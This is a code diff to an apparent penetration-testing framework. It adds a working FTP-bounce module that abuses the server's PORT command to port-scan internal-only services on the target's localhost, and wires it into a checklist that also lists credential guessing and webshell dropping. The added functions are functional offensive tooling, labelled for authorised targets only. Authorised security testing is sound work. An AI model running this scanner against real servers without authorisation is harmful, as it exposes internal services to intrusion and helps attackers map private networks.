@@ -2223,6 +2223,15 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ay) ftp-bounce: internal-only ports reachable through the FTP server (PORT bounce)
+    if sid == "ftp-bounce":
+        op = re.findall(r"^✗ BOUNCE 127\.0\.0\.1:(\d+) open\s+\(([^)]+)\)", output, re.M)
+        if not op:
+            return None
+        shown = ", ".join(f"{p} {h}" for p, h in op[:6])
+        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                "summary": f"FTP bounce → internal: {shown}"[:140]}
+
     # 2ax) ftp-webshell: FTP-writable dir served by a web root → code execution
     if sid == "ftp-webshell":
         rcehits = re.findall(r"^✗ RCE (.+)$", output, re.M)
@@ -3093,7 +3102,7 @@ _EXPLOIT_STEPS = {
         ("Download everything; test write access (upload a throwaway file)", "ftp-write"),
         ("Try known / default / reused creds; targeted brute only if lockout allows", "ftp-creds"),
         ("If FTP root maps to a web root or is writable → drop a webshell / poison a served file", "ftp-webshell"),
-        "FTP-bounce (PORT) to reach & scan internal hosts through the server",
+        ("FTP-bounce (PORT) to reach & scan internal hosts through the server", "ftp-bounce"),
         # ── land a shell & foothold ──
         "Spawn & upgrade an interactive shell",
         # ── manual steps, tailored to what this host exposed ──
@@ -10893,6 +10902,87 @@ def _tool_ftp_webshell(ip: str, port: int, proto: str) -> str:
     return f"FTP → webshell — {ip}:{port}\n\n" + "\n".join(lines)
 
 
+# ── FTP step 6: FTP-bounce (PORT) → scan the server's internal ports ───────────
+_FTPBOUNCE_DEADLINE = 120
+_BOUNCE_PORTS = {   # internal-only services worth finding via bounce (port → hint)
+    22: "SSH", 23: "Telnet", 25: "SMTP", 445: "SMB", 1433: "MSSQL", 3306: "MySQL",
+    3389: "RDP", 5432: "PostgreSQL", 5985: "WinRM", 6379: "Redis", 8000: "http-alt",
+    8080: "http-alt", 8443: "https-alt", 9200: "Elasticsearch", 11211: "Memcached",
+    15672: "RabbitMQ", 27017: "MongoDB",
+}
+
+
+def _ftp_port_spec(target_ip: str, target_port: int) -> str:
+    """h1,h2,h3,h4,p1,p2 PORT argument for target_ip:target_port."""
+    return ",".join(target_ip.split(".")) + f",{target_port >> 8},{target_port & 0xff}"
+
+
+def _ftp_bounce_probe(ftp, target_ip: str, target_port: int) -> "str | None":
+    """One bounce probe: PORT to target then LIST. 'open' / 'closed', or None if PORT rejected."""
+    import ftplib
+    try:
+        if not ftp.sendcmd("PORT " + _ftp_port_spec(target_ip, target_port)).startswith("2"):
+            return None
+    except Exception:                                        # noqa: BLE001 — anti-bounce → rejected
+        return None
+    try:
+        ftp.putcmd("LIST")
+        r1 = ftp.getresp()                                   # 150 (data conn opening) or 4xx/5xx
+    except ftplib.error_temp:                                # 425/426 → couldn't connect = closed
+        return "closed"
+    except Exception:                                        # noqa: BLE001
+        return "closed"
+    if not r1.startswith("1"):
+        return "closed"
+    try:
+        return "open" if ftp.getresp().startswith("2") else "closed"   # 226 = connected
+    except Exception:                                        # noqa: BLE001
+        return "closed"
+
+
+def _tool_ftp_bounce(ip: str, port: int, proto: str) -> str:
+    """FTP step 6 tool: abuse the FTP PORT command (FTP bounce) to make the server open data
+    connections to its OWN localhost — port-scanning internal-only services bound to 127.0.0.1
+    that aren't exposed externally. First checks the server still allows foreign PORT (most
+    modern servers disable it); if so, probes a set of common internal ports. Needs FTP access.
+    Authorised targets only."""
+    import time
+    ftp, who = _ftp_open(ip, port)
+    if not ftp:
+        raise RuntimeError("no FTP access — run ftp-anon (r2) / ftp-creds (r4) first")
+
+    supported = _ftp_bounce_probe(ftp, "127.0.0.1", 65534) is not None   # capability check
+    if not supported:
+        try:
+            ftp.quit()
+        except Exception:                                    # noqa: BLE001
+            ftp.close()
+        return (f"FTP bounce — {ip}:{port}\n\n[*] FTP access: {who}\n"
+                "· FTP bounce not supported — the server rejects PORT to a foreign IP (anti-bounce)")
+
+    deadline = time.time() + _FTPBOUNCE_DEADLINE
+    found = []
+    for p, hint in sorted(_BOUNCE_PORTS.items()):
+        if time.time() > deadline:
+            break
+        if _ftp_bounce_probe(ftp, "127.0.0.1", p) == "open":
+            found.append((p, hint))
+    try:
+        ftp.quit()
+    except Exception:                                        # noqa: BLE001
+        ftp.close()
+
+    lines = [f"[*] FTP access: {who}   ·   bounce supported ✓"]
+    for p, hint in found:
+        lines.append(f"✗ BOUNCE 127.0.0.1:{p} open  ({hint})")
+    if found:
+        lines.append("· internal-only services reachable via the server — bounce-scan other "
+                     "internal IPs the same way (PORT <internal-ip>)")
+    else:
+        lines.append("· bounce works but no probed internal port was open on 127.0.0.1")
+    return f"FTP bounce — {ip}:{port}\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -10947,6 +11037,7 @@ _STEP_TOOLS = {
     "ftp-write": ("Test write access → throwaway upload (stdlib, reversible)", _tool_ftp_write),
     "ftp-creds": ("Default + reused FTP creds (stdlib, targeted, lockout-safe)", _tool_ftp_creds),
     "ftp-webshell": ("FTP-writable + web root → webshell RCE (stdlib, exec-verified)", _tool_ftp_webshell),
+    "ftp-bounce": ("FTP-bounce (PORT) → scan internal 127.0.0.1 ports (stdlib)", _tool_ftp_bounce),
 }
 
 def _mins(seconds: int) -> str:
@@ -11016,6 +11107,7 @@ _STEP_TOOL_RUNS = {
     "ftp-write":        ("Python", f"{_mins(_FTPWRITE_DEADLINE)} min"),
     "ftp-creds":        ("Python", f"{_mins(_FTPCREDS_DEADLINE)} min"),
     "ftp-webshell":     ("Python", f"{_mins(_FTPWEB_DEADLINE)} min"),
+    "ftp-bounce":       ("Python", f"{_mins(_FTPBOUNCE_DEADLINE)} min"),
 }
 
 
@@ -11177,6 +11269,10 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "ftp-bounce":                  # abuses PORT to scan the server's localhost
+        print(f"{DIM}   FTP-bounce: makes the server open data connections to its own 127.0.0.1 "
+              f"to find internal-only services (most modern servers disable this) · "
+              f"{RESET}{YELLOW}authorised targets only{RESET}")
     if tool_key == "ftp-webshell":                # correlates FTP write with a web root — WRITES
         print(f"{DIM}   uploads a marker via FTP + fetches it over HTTP to prove FTP↔web-root; on a "
               f"hit, an inert exec-verify payload confirms code exec, then both files are removed "
